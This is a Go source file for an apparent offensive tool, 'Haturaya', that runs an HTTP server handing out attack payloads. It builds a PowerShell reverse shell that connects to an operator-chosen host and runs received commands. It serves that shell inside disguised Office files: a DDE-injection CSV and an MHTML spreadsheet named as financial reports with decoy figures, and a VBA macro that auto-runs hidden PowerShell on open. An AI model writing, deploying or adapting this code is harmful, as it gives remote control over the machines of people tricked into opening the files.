// Package web provides the HTTP server that distributes payloads.
package web

import (
	"fmt"
	"html"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"unicode/utf16"
	"encoding/base64"
)

// Server is the HTTP payload-distribution server.
type Server struct {
	host        string
	port        int
	payloadsDir string
}

// New creates a Server. The payloads directory is resolved from the
// HATURAYA_PAYLOADS_DIR env var or ../web_app/payloads relative to the binary.
func New(host string, port int) *Server {
	return &Server{
		host:        host,
		port:        port,
		payloadsDir: resolvePayloadsDir(),
	}
}

// Start binds to host:port and serves requests. Blocks until the process exits.
func (s *Server) Start() error {
	mux := http.NewServeMux()

	// Dynamic Excel/Office payload routes — registered before the /payloads/ prefix.
	mux.HandleFunc("/payloads/excel.csv", s.handleDDECSV)
	mux.HandleFunc("/payloads/excel.xls", s.handleMHTMLXLS)
	mux.HandleFunc("/payloads/macro.vba", s.handleVBA)

	// Static payload files.
	mux.HandleFunc("/payloads/", s.handlePayloadFile)

	// Index / search.
	mux.HandleFunc("/search", s.handleSearch)
	mux.HandleFunc("/", s.handleIndex)

	addr := fmt.Sprintf("%s:%d", s.host, s.port)
	log.Printf("[web] listening on http://%s", addr)
	return http.ListenAndServe(addr, mux)
}

// resolvePayloadsDir determines the directory that holds payload files.
func resolvePayloadsDir() string {
	if d := os.Getenv("HATURAYA_PAYLOADS_DIR"); d != "" {
		return d
	}
	exe, err := os.Executable()
	if err != nil {
		return filepath.Join("web_app", "payloads")
	}
	return filepath.Clean(filepath.Join(filepath.Dir(exe), "..", "web_app", "payloads"))
}

// listFiles returns sorted filenames from the payloads directory.
func (s *Server) listFiles(query string) []string {
	entries, err := os.ReadDir(s.payloadsDir)
	if err != nil {
		return nil
	}
	var out []string
	q := strings.ToLower(query)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if q == "" || strings.Contains(strings.ToLower(name), q) {
			out = append(out, name)
		}
	}
	sort.Strings(out)
	return out
}

// renderIndex writes the HTML index page.
func (s *Server) renderIndex(w http.ResponseWriter, files []string, query string) {
	var sb strings.Builder
	sb.WriteString(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Haturaya - Payloads</title>
<style>
body{font-family:monospace;background:#0d0d0d;color:#00ff41;margin:2rem}
h1{color:#ff003c;letter-spacing:4px}
form{margin:1rem 0}
input[type=text]{background:#111;color:#00ff41;border:1px solid #00ff41;padding:.4rem .8rem;width:300px;font-family:inherit}
button{background:#00ff41;color:#0d0d0d;border:none;padding:.4rem 1rem;cursor:pointer;font-family:inherit;font-weight:bold}
ul{list-style:none;padding:0}
li{padding:.3rem 0;border-bottom:1px solid #1a1a1a}
a{color:#00ff41;text-decoration:none}
a:hover{color:#ff003c}
.empty{color:#555;font-style:italic}
</style></head><body>
<h1>[ HATURAYA PAYLOADS ]</h1>
<form action="/search" method="GET">
  <input type="text" name="query" value="`)
	sb.WriteString(html.EscapeString(query))
	sb.WriteString(`" placeholder="search payloads...">
  <button type="submit">SEARCH</button>
</form>
<ul>`)

	if len(files) == 0 {
		sb.WriteString(`<li class="empty">No payloads found.</li>`)
	}
	for _, f := range files {
		esc := html.EscapeString(f)
		sb.WriteString(fmt.Sprintf(`<li><a href="/payloads/%s">%s</a></li>`, esc, esc))
	}
	sb.WriteString(`</ul></body></html>`)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(sb.String()))
}

func (s *Server) handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	s.renderIndex(w, s.listFiles(""), "")
}

func (s *Server) handleSearch(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query().Get("query")
	s.renderIndex(w, s.listFiles(q), q)
}

func (s *Server) handlePayloadFile(w http.ResponseWriter, r *http.Request) {
	// Strip /payloads/ prefix and prevent path traversal.
	name := strings.TrimPrefix(r.URL.Path, "/payloads/")
	if name == "" || strings.Contains(name, "/") || strings.Contains(name, "..") {
		http.NotFound(w, r)
		return
	}
	fpath := filepath.Join(s.payloadsDir, name)
	info, err := os.Stat(fpath)
	if err != nil || info.IsDir() {
		http.NotFound(w, r)
		return
	}
	http.ServeFile(w, r, fpath)
}

// ── Dynamic Office payload handlers ─────────────────────────────────────────

func psRevShell(lhost, lport string) string {
	return fmt.Sprintf(
		"$c=New-Object Net.Sockets.TCPClient('%s',%s);"+
			"$s=$c.GetStream();"+
			"[byte[]]$b=0..65535|%%{0};"+
			"while(($i=$s.Read($b,0,$b.Length))-ne 0){"+
			"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"+
			"$r=(iex $d 2>&1|Out-String);"+
			"$r2=$r+'PS '+(pwd).Path+'> ';"+
			"$sb=([Text.Encoding]::ASCII).GetBytes($r2);"+
			"$s.Write($sb,0,$sb.Length);$s.Flush()};"+
			"$c.Close()",
		lhost, lport,
	)
}

// webPsB64 encodes the PowerShell shell as UTF-16LE base64.
func webPsB64(lhost, lport string) string {
	ps := psRevShell(lhost, lport)
	codes := utf16.Encode([]rune(ps))
	buf := make([]byte, len(codes)*2)
	for i, v := range codes {
		buf[i*2] = byte(v)
		buf[i*2+1] = byte(v >> 8)
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// handleDDECSV serves a DDE-injection CSV that triggers on Windows Excel open.
func (s *Server) handleDDECSV(w http.ResponseWriter, r *http.Request) {
	lhost := r.URL.Query().Get("lhost")
	if lhost == "" {
		lhost = "127.0.0.1"
	}
	lport := r.URL.Query().Get("lport")
	if lport == "" {
		lport = "9999"
	}
	ps := psRevShell(lhost, lport)
	dde := fmt.Sprintf(`=cmd|" /c powershell -nop -w hidden -c \"%s\""!A1`, ps)
	body := dde + "\r\n" +
		"Department,Q1,Q2,Q3,Q4\r\n" +
		"Sales,120000,145000,98000,210000\r\n" +
		"Marketing,45000,52000,41000,67000\r\n" +
		"Engineering,230000,245000,251000,270000\r\n"

	w.Header().Set("Content-Type", "text/csv")
	w.Header().Set("Content-Disposition", "attachment; filename=financial_report_2024.csv")
	w.Write([]byte(body))
}

// handleMHTMLXLS serves an MHTML Excel file with a DDE formula.
func (s *Server) handleMHTMLXLS(w http.ResponseWriter, r *http.Request) {
	lhost := r.URL.Query().Get("lhost")
	if lhost == "" {
		lhost = "127.0.0.1"
	}
	lport := r.URL.Query().Get("lport")
	if lport == "" {
		lport = "9999"
	}
	ps := psRevShell(lhost, lport)
	formula := fmt.Sprintf(`=cmd|" /c powershell -nop -w hidden -c \"%s\""!A0`, ps)
	mhtml := "MIME-Version: 1.0\r\n" +
		"Content-Type: multipart/related;boundary=\"----=_Excel_Bound_\"\r\n" +
		"\r\n" +
		"------=_Excel_Bound_\r\n" +
		"Content-Type: text/html;charset=utf-8\r\n" +
		"\r\n" +
		"<html xmlns:o=\"urn:schemas-microsoft-com:office:office\"\r\n" +
		"      xmlns:x=\"urn:schemas-microsoft-com:office:excel\"\r\n" +
		"      xmlns=\"http://www.w3.org/TR/REC-html40\">\r\n" +
		"<head>\r\n" +
		"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\r\n" +
		"<meta name=\"ProgId\" content=\"Excel.Sheet\">\r\n" +
		"</head>\r\n" +
		"<body>\r\n" +
		"<table>\r\n" +
		fmt.Sprintf("<tr><td>%s</td><td>Department</td><td>Q1</td><td>Q2</td></tr>\r\n", formula) +
		"<tr><td>Sales</td><td>120000</td><td>145000</td></tr>\r\n" +
		"<tr><td>Marketing</td><td>45000</td><td>52000</td></tr>\r\n" +
		"</table>\r\n" +
		"</body></html>\r\n" +
		"\r\n" +
		"------=_Excel_Bound_--\r\n"

	w.Header().Set("Content-Type", "application/vnd.ms-excel")
	w.Header().Set("Content-Disposition", "attachment; filename=Q1_Report.xls")
	w.Write([]byte(mhtml))
}

// handleVBA serves a VBA macro file for import into Excel's VBA editor.
func (s *Server) handleVBA(w http.ResponseWriter, r *http.Request) {
	lhost := r.URL.Query().Get("lhost")
	if lhost == "" {
		lhost = "127.0.0.1"
	}
	lport := r.URL.Query().Get("lport")
	if lport == "" {
		lport = "9999"
	}
	ps := psRevShell(lhost, lport)
	vba := "Attribute VB_Name = \"AutoRun\"\r\n" +
		"\r\n" +
		"Sub Auto_Open()\r\n" +
		"    Dim sh As Object\r\n" +
		"    Set sh = CreateObject(\"WScript.Shell\")\r\n" +
		fmt.Sprintf("    sh.Run \"powershell -nop -w hidden -c \"\"%s\"\"\", 0, False\r\n", ps) +
		"End Sub\r\n" +
		"\r\n" +
		"Sub AutoOpen()\r\n" +
		"    Auto_Open\r\n" +
		"End Sub\r\n" +
		"\r\n" +
		"Sub Workbook_Open()\r\n" +
		"    Auto_Open\r\n" +
		"End Sub\r\n"

	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Content-Disposition", "attachment; filename=macro.vba")
	w.Write([]byte(vba))
}
